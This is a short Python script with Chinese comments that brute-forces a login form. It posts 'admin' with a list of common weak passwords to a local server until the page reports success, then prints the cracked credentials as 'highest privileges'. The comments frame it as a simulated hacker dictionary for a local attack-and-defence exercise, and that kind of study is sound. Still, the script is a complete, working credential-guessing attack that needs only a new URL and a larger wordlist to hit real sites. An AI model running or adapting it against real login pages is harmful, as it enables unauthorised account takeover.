import requests
import time

def brute_force_login():
    url = "http://127.0.0.1:8081/login"
    username = "admin"
    
    # 模拟一个黑客手中的“弱口令字典”
    # 在真实的攻防中，这个字典可能会包含几十万甚至上百万个常用密码
    passwords = [
        "111111", "admin123", "password", "666666", 
        "qwert", "admin888", "123456", "root123"
    ]
    
    print(f"[*] 开始对目标 {url} 发起爆破测试...")
    start_time = time.time()
    
    for pwd in passwords:
        print(f"[-] 正在尝试尝试密码: {pwd}")
        
        # 构造 POST 提交的表单数据
        payload = {
            "username": username,
            "password": pwd
        }
        
        try:
            # 发起 POST 请求，相当于模拟浏览器点击了“登录”按钮
            response = requests.post(url, data=payload, timeout=2)
            
            # 判断响应网页的 HTML 代码中是否包含我们设定的成功标志
            if "登录成功" in response.text:
                print(f"\n[+] 🎯 爆破成功！")
                print(f"[+] 拿到最高权限 -> 账号: {username} | 密码: {pwd}")
                break # 密码正确，停止爆破
            
            # 为了防止发包太快导致咱们本地的终端卡屏，稍微暂停 0.1 秒
            time.sleep(0.1) 
            
        except Exception as e:
            print(f"[!] 网络请求出错: {e}")
            
    end_time = time.time()
    print(f"\n[*] 攻击结束，总耗时: {end_time - start_time:.2f} 秒")

if __name__ == '__main__':
    brute_force_login()